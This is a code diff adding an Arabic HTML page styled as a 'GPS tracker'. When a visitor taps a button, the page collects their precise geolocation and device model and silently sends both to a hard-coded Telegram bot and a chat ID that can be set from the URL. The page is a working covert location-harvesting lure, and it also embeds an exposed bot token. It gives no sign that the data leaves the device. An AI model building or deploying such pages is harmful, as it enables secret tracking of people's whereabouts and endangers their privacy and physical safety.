@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📍 تتبع الموقع</title>
+    <style>
+        :root { --green: #00ff41; --red: #ff0040; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000; color: #fff;
+            height: 100vh; display: flex;
+            align-items: center; justify-content: center;
+            text-align: center; padding: 20px;
+        }
+        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
+        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
+        @keyframes scanLine { from{top:-100%} to{top:100%} }
+        
+        .scan-line { position: fixed; left: 0; right: 0; height: 2px; background: rgba(0,255,65,0.1); pointer-events: none; animation: scanLine 2s linear infinite; z-index: 999; }
+        .container { max-width: 400px; width: 100%; }
+        .page { display: none; } .page.active { display: block; }
+        
+        .skull { font-size: 60px; animation: pulse 0.5s infinite; }
+        h1 { font-size: 22px; color: var(--green); text-shadow: 0 0 30px var(--green); }
+        .subtitle { color: #333; font-size: 11px; letter-spacing: 2px; margin-bottom: 20px; }
+        
+        .device-card {
+            background: #0a0a0a; border: 2px solid var(--green);
+            border-radius: 14px; padding: 18px; margin-bottom: 20px;
+            box-shadow: 0 0 30px rgba(0,255,65,0.2);
+        }
+        .device-card .d-name { color: var(--green); font-size: 16px; font-weight: 700; }
+        
+        .btn {
+            width: 100%; padding: 18px; border-radius: 12px;
+            border: 2px solid var(--green); background: #0a1a0a;
+            color: var(--green); font-size: 18px; font-weight: 700;
+            cursor: pointer; font-family: 'Courier New', monospace;
+            text-shadow: 0 0 10px var(--green);
+            box-shadow: 0 0 30px rgba(0,255,65,0.3);
+            animation: flicker 0.8s infinite;
+        }
+        .btn:active { background: #0a2a0a; }
+        
+        .code-screen {
+            background: #000; border: 2px solid var(--green);
+            border-radius: 10px; padding: 14px; margin: 16px 0;
+            color: var(--green); font-size: 10px; line-height: 1.5;
+            max-height: 200px; overflow-y: auto;
+        }
+        
+        .countdown { font-size: 40px; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); }
+        .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: var(--red); width: 0%; }
+        
+        .success-icon { font-size: 70px; }
+        .success-text { color: var(--green); font-size: 22px; font-weight: 700; }
+        
+        #map { width: 100%; height: 200px; border-radius: 10px; margin-top: 10px; border: 1px solid var(--green); display: none; }
+        .location-text { color: var(--green); font-size: 14px; margin: 10px 0; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="scan-line"></div>
+
+<div class="container">
+    <div class="page active" id="page-home">
+        <div class="skull">📍</div>
+        <h1>تتبع الموقع</h1>
+        <div class="subtitle">━ GPS TRACKER ━</div>
+        <div class="device-card">
+            <div class="d-name" id="device-name">📱 جاري الكشف...</div>
+        </div>
+        <button class="btn" onclick="startTracking()">📍 اضغط لتحديد الموقع</button>
+    </div>
+    
+    <div class="page" id="page-tracking">
+        <div class="skull">⏳</div>
+        <h1>جاري تحديد الموقع...</h1>
+        <div class="subtitle">━ FETCHING GPS ━</div>
+        <div class="code-screen" id="code-screen"></div>
+        <div class="countdown" id="countdown">10</div>
+        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+        <div class="location-text" id="location-text"></div>
+        <div id="map"></div>
+    </div>
+    
+    <div class="page" id="page-done">
+        <div class="success-icon">✅</div>
+        <div class="success-text">تم تحديد الموقع</div>
+        <p style="color:#333;">الموقع اتبعت</p>
+    </div>
+</div>
+
+<script>
+const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
+
+function getDevice() {
+    const ua = navigator.userAgent;
+    const match = ua.match(/; ([^;]+) Build/);
+    return { name: match ? match[1].trim() : 'جهاز غير معروف' };
+}
+const device = getDevice();
+document.getElementById('device-name').textContent = '📱 ' + device.name;
+
+function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+
+async function startTracking() {
+    showPage('page-tracking');
+    
+    const codeScreen = document.getElementById('code-screen');
+    const countdownEl = document.getElementById('countdown');
+    const progressFill = document.getElementById('progress-fill');
+    const logs = ['[■] INITIALIZING GPS...','[■] CONNECTING TO SATELLITE...','[■] FETCHING COORDINATES...','[■] CALCULATING POSITION...','[■] ACCURACY: HIGH','[✓] LOCATION FOUND'];
+    let seconds = 10;
+    
+    const interval = setInterval(() => {
+        seconds--;
+        countdownEl.textContent = seconds;
+        progressFill.style.width = ((10 - seconds) / 10 * 100) + '%';
+        const lines = Math.floor(((10 - seconds) / 10) * logs.length);
+        codeScreen.innerHTML = logs.slice(0, Math.min(lines + 1, logs.length)).join('<br>');
+        codeScreen.scrollTop = codeScreen.scrollHeight;
+        if (seconds <= 0) clearInterval(interval);
+    }, 1000);
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const { latitude, longitude } = pos.coords;
+            
+            // عرض الموقع
+            document.getElementById('location-text').textContent = `📍 ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+            document.getElementById('location-text').style.display = 'block';
+            
+            // خريطة
+            document.getElementById('map').style.display = 'block';
+            document.getElementById('map').innerHTML = `<iframe width="100%" height="200" frameborder="0" src="https://maps.google.com/maps?q=${latitude},${longitude}&z=16&output=embed"></iframe>`;
+            
+            // إرسال للتليجرام
+            const text = `📍 موقع جديد\n📱 ${device.name}\n🗺️ https://maps.google.com/?q=${latitude},${longitude}`;
+            await fetch(`https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text })
+            });
+            
+            // إرسال الموقع كـ Location
+            await fetch(`https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendLocation`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
+            });
+            
+            showPage('page-done');
+        }, (err) => {
+            codeScreen.innerHTML = '❌ ' + err.message;
+        }, { enableHighAccuracy: true, timeout: 15000 });
+    } else {
+        codeScreen.innerHTML = '❌ GPS غير مدعوم';
+    }
+}
+</script>
+</body>
+</html>
